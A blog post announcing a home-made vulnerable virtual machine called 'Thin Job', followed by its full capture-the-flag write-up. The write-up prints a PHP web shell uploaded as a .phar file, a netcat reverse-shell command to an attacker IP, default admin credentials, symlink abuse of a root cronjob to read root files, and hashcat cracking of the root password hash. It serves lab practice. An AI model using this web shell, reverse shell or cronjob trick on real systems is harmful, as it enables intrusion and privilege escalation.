# Thin Job

Hi everyone! I just announce my first box and I called it "Thin Job"! I tried to submit it to Hack the Box but they rejected it but (in my opinion) they don't explain enough the motivation.

<img src="/assets/img/meme/rejectedBox.jpg" width="50%" height="50%">

I go on and I want to share it anyway because I had fun while I create it.

The link of the box is the following:

[ThnJob Box](https://mega.nz/file/8FkQFRzK#bvorxu2FcKjz4bdLJg6x39in_8ikhGIZltYk3_5Cgl0)

You can download the box and then import on VirtualBox.

I write also the write-up but if you would try to exploit the box, don't read the follow &#128527;


*You read it if you want...*

*Do you want to read???*

*Are you sure???*

*Maybe you can exploit the box first...*

*Ok, as you want...*

*Here the write-up...*


## <span style="color: var(--link-color);">Write-Up</span>

The box includes an apache web server that hosts the FileThingie file manager on port 80 and contains a hint to understand that FileThingie is used.
By acceding the machine, there is a cronjob taht is run by the root user and, so, can read all files. The cronjob use a symlink to read the root files.

### <span style="color: var(--link-color);">Enumeration</span>

```
sudo nmap -p- -O -sS -sV --reason --open 192.168.1.125 -Pn
```

![Nmap](/assets/img/posts/thinjob/nmap.png)


We find the Apache service on port 80.

### <span style="color: var(--link-color);">Foothold</span>

On port 80, we get the previous image that suggests looking at the code. By analyzing the source code of the page, we retrieve:

![image-20211015112036302](/assets/img/posts/thinjob/hintFileThingie.png)

There is a hint that suggests that they use Filethingie on path `/filethingie`. But by navigating this path we retrieve a blank page.  

By searching online the string `"filethingie"`, we find a GitHub page:

https://github.com/leefish/filethingie

This repository gives us the page that can be used:

![image-20211014173105679](/assets/img/posts/thinjob/codeGitHub.png)



We try `ft2.php` because, by opening it, we read some PHP and HTML code and, indeed, we retrieve the web application:

![image-20211014173421240](/assets/img/posts/thinjob/filethingie.png)

By using the following credentials:

username: admin

password: admin



We get the access:

![image-20211014173602728](/assets/img/posts/thinjob/filethingieAccess.png)

By analyzing the source code of the page we get another hint (maybe Beppe's boss should stop writing messages on code LOL):

![image-20211015111733696](/assets/img/posts/thinjob/hintUpload.png)



So it misses the HTML upload code, indeed by analyzing the source code on github, we find the upload code:

![image-20211014174201589](/assets/img/posts/thinjob/codeUpload.png)



We add the piece of code but first, we need to modify it a bit because we must remove the PHP functions that are linked in the code. So the final code is:

```html
<div class="section" id="create">
   <h2>Upload files</h2>
   <form action="ft2.php" method="post" enctype="multipart/form-data">
      <div id="uploadsection">
         <input type="hidden" name="MAX_FILE_SIZE" value="MAXSIZE" />
         <input type="file" class="upload" name="localfile" id="localfile-0" size="12" />
         <input type="hidden" name="act" value="upload" />
         <input type="hidden" name="dir" value="./filethingie/" />
      </div>
   <div id="uploadbutton">
      <input type="submit" name="submit" value="Upload" />
   </div>
</div>
```



By adding this code, we retrieve the upload functionality:

![image-20211014174849255](/assets/img/posts/thinjob/uploadFileThingie.png)



We try  to upload the file `shell.php`:

```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```



But we obtain the following error:

![image-20211015112124106](/assets/img/posts/thinjob/uploadNotAllowed.png)

So, we upload `shell.phar` with the same code as before and it is accepted:

![image-20211015112149522](/assets/img/posts/thinjob/uploadAllowed.png)

### <span style="color: var(--link-color);">Shell</span>

We can use the uploaded file to execute a reverse shell:

```
http://192.168.1.125/filethingie/shell.phar?cmd=nc%20192.168.1.126%205555%20-e%20/bin/bash
```

![image-20211014191056210](/assets/img/posts/thinjob/initialShell.png)



`www-data` can read the Beppe home and, so, read the user flag:

![image-20211015101643983](/assets/img/posts/thinjob/flagBeppe.png)



### <span style="color: var(--link-color);">Privilege Escalation</span>

In Beppe's home we see some file:

![image-20211015101722487](/assets/img/posts/thinjob/fileBeppe.png)

The first one is a symlink to a root file and the second is a root's file. The second one contains this:

![image-20211015101820089](/assets/img/posts/thinjob/outputFile.png)

As it said, the file is used to copy.

Looking at the root folder, we get:

![image-20211015101801888](/assets/img/posts/thinjob/rootFile.png)

And there is the `to_copy.txt` file that links the `input.txt` file in the Beppe's home. Also, there is a `backup.txt` file but we cannot read it.

Looking at the `/etc/cron.d` folder there is a cronjob `.copy.txt`:

```python
import os

# Beppe if you need, this script is executed every 1 minute!

def write_tmp(psw):
	f = open("/home/beppe/output.txt", "w")
	f.write(psw)
	f.close()
	return True


if __name__ == "__main__":

	pass_file = open("/home/beppe/input.txt","r")
	psw = pass_file.read()
	pass_file.close()

	write_tmp(psw)
```

We note the comment:
```
# Beppe if you need, this script is executed every 1 minute!
```

The cronjob runs every minute and it read the file `/home/beppe/input.txt` and writes it on `/home/beppe/output.txt`. The input file is a symlink to the file `/root/to_copy.txt` that is an "example" file. But changing the symlink with other root files, the player can read them. 

So, we can modify the symlink to read the `backup.txt` file in the root folder, by executing the command:

```
ln -fsn /root/backup.txt input.txt
```

And we have modified the symlink:

![image-20211015102318187](/assets/img/posts/thinjob/modifySymlink.png)

After 1 minute, we look at the `output.txt` file and we obtain the hashed password of the root.

![image-20211015115449585](/assets/img/posts/thinjob/outputRootHash.png)



We crack it with hashcat:

```
hashcat -m 1800 hash1.txt rockyou.txt
```



![image-20211015115355406](/assets/img/posts/thinjob/hashCracked.png)



Then, by executing `su -` we have root access:

![image-20211015115509593](/assets/img/posts/thinjob/privesc.png)

And we obtain the root flag:

![image-20211015103745263](/assets/img/posts/thinjob/rootFlag.png)





With the cronjob script, the players can read every root file, like `/etc/shadow`.

Furthermore, since the password is guessable, the player can also guess it.
